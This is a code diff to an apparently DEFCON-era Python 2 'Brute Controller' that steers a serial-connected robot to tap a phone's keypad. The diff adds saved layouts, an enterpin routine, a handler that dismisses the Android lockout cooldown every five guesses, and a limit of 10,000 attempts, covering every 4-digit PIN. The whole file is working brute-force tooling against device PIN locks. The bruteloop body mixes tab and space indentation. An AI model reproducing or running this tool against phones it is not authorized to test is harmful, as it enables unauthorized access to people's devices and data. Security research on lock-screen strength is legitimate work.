@@ -15,18 +15,21 @@ import sys
 import time
 import re
 import serial
-import serial.tools.list_ports
+import pickle
+#import serial.tools.list_ports
 
 ser = None
 
 FIRSTCHAR=ord('a')
 
-SERIALPORT='/dev/tty.usbmodem1411'
+SERIALPORT="COM4" #'/dev/tty.usbmodem1411'
 
 XOF1=1.8
 YOF1=.8
 DR=1.75
 LI=0;
+
+global_layout = None
 
 
 writedelay=.5
@@ -261,8 +264,10 @@ def definebuttons(x,y,z):
 	layout=buttonguesslayout(onekey[0],onekey[1])
 	return layout
 		
-		 
+""" ADDED 7-18: 'o' loads layout.p, 'p' saves the current layout to
+layout.p, Z is the "OK" button, X is the "OK" button for the cooldown screen"""
 def manualmove(x,y,z,stepsize=.1, layout=None, fix=False):
+	global global_layout
 	newx=x
 	newy=y
 	newz=z
@@ -282,6 +287,16 @@ def manualmove(x,y,z,stepsize=.1, layout=None, fix=False):
 			newx-=stepsize
 		elif curr=='d':
 			newx+=stepsize
+		elif curr=='q':
+			newz+=stepsize
+		elif curr=='e':
+			newz-=stepsize
+		elif curr=='o':
+			global_layout = pickle.load(open("layout.p", 'r'))
+			layout = global_layout
+			print layout
+		elif curr=='p':
+			pickle.dump(layout, open("layout.p", 'w'))
 		elif curr=='k':
 			return (newx, newy, newz)
 		elif layout is not None:
@@ -290,16 +305,33 @@ def manualmove(x,y,z,stepsize=.1, layout=None, fix=False):
 				print "Point ", curr
 				newx=layout[curr]['x']
 				newy=layout[curr]['y']
+				newz=layout[curr]['z']
 			if curr=='p':
 				print layout
-			if fix and curr[0]=='F':
+			if fix and len(curr)> 0 and curr[0]=='F':
 				layout[curr[1]]['x']=newx
 				layout[curr[1]]['y']=newy
 				layout[curr[1]]['z']=newz
-				
 	
+		global_layout= layout
 	
+			
+
+def brutekeys(pinlength, keys="0123456789", randomorder=False):
+	"""
+	Returns a list of all possibilities to try, based on the length of PIN and buttons given.
+	
+	Yeah, lots of slow list copying here, but who cares, it's dwarfed by the actual guessing.
+	"""
+	allpossible = list(itertools.imap(lambda x: "".join(x),itertools.product(keys, repeat=pinlength)))
+	if randomorder:
+		random.shuffle(allpossible)
+
+	return allpossible
+
 def bruteloop(brutelist, maxtries=None, actionlist=()):
+	global global_layout
+	cooldown_ok = global_layout['X']
 	"""Try to push the buttons for each possible PIN in the given list
 		
 		If an actionlist is given, function in second position will be called
@@ -318,35 +350,48 @@ def bruteloop(brutelist, maxtries=None, actionlist=()):
 	tries=0
 	persister=None
 	brutecontinue=True
-	
+			
 	for pin in brutelist:
 		print "===Pushing %s:"%(pin,)
-		for number in pin:
-			#print "pushing %s"%number
-			push(toIdentifier(number))
-		tries+=1
-		for modulo,func in actionlist:
-			if tries % modulo == 0:			
-				returnvalue=func(tries,pin,persister)
-				if returnvalue is not None:
-					brutecontinue, persister = returnvalue
-		if tries>=maxtries or not brutecontinue:
-			break
-			
+                                        #for number in pin:
+                                        #print "pushing %s"%number
+                                        #push(toIdentifier(number))
+                                enterpin(pin)
+                                
+                                #push(toIdentifier('Z'))
+                                tries+=1
+
+                                if (tries % 5 == 0):
+                                        move(0,0,0)
+                                        time.sleep(1)
+                                        move(cooldown_ok['x'], cooldown_ok['y'], cooldown_ok['z'])
+                                        move(0,0,0)
+                                        androidPINwait(0,0,0)
+                                
+                                for modulo,func in actionlist:
+                                        if tries % modulo == 0:			
+                                                returnvalue=func(tries,pin,persister)
+                                                if returnvalue is not None:
+                                                        brutecontinue, persister = returnvalue
+                                if tries>=maxtries or not brutecontinue:
+                                        break
+				
 	move(0,0,0)
-			
 
-def brutekeys(pinlength, keys="0123456789", randomorder=False):
-	"""
-	Returns a list of all possibilities to try, based on the length of PIN and buttons given.
-	
-	Yeah, lots of slow list copying here, but who cares, it's dwarfed by the actual guessing.
-	"""
-	allpossible = list(itertools.imap(lambda x: "".join(x),itertools.product(keys, repeat=pinlength)))
-	if randomorder:
-		random.shuffle(allpossible)
 
-	return allpossible
+""" Couldn't get the EP command to work with 5 sets of coordinates - too much in one serial send?"""
+def enterpin(pin):
+	global global_layout
+	ok_required = True
+	for number in pin:
+		coordinate = global_layout[str(number)]
+		move(coordinate['x'], coordinate['y'], coordinate['z'])
+		time.sleep(writedelay)
+		
+	if (ok_required):
+		coordinate = global_layout[str('Z')]
+		move(coordinate['x'], coordinate['y'], coordinate['z'])
+		time.sleep(writedelay)
 
 
 def loadlist(filename):
@@ -402,6 +447,7 @@ def androidPINwait(guessnum, PIN, persistdata):
 
 def main():
 	global writedelay
+	global global_layout
 	print "Brute Controller"
 	print "\t This is prerelease code.  A better version will be available after DEFCON at:"
 	print "\t\twww.isecpartners.com"
@@ -416,22 +462,28 @@ def main():
 	print "+="*10+" Configure Robot "+"+="*10
 	print "\n\n"
 	drop=finddrop()
-	lift=drop-.5
+	lift=drop
 	findaxes(x=0,y=0, z=lift)
+	lift = 0
 	layout=definebuttons(x=0,y=0,z=lift)
 
 	print "everything's set!  To check calibration, type numbers."
-	print "to correct, use WSAD to move head to correct location for a key," 
+	print "to correct, use WSADQE to move head to correct location for a key," 
 	print "then type 'F#' where # is the key to fix."
+	print "o to load a configuration from the pickle file \"layout.p\""
 	print "k to begin brute"
 	manualmove(x=0,y=0,z=lift, layout=layout, fix=True)
+	if not global_layout is None:
+		layout = global_layout
 	print "Calibrating robot"
-	robotconfig(drop=drop, lift=lift, buttoncoords=layout)	
+	print layout
+	#robotconfig(drop=0, lift=lift, buttoncoords=layout)	
 	
-	writedelay=.5
+	writedelay=.3
+		
 	print "*="*5+"test all 4 digit pins, random order"
 	brutes=brutekeys(4, randomorder=False)
-	bruteloop(brutes,maxtries=10)
+	bruteloop(brutes,maxtries=10000)
 	
 	"""
 	print "*="*5+"test all 4 digit pins ending in 99[98]"
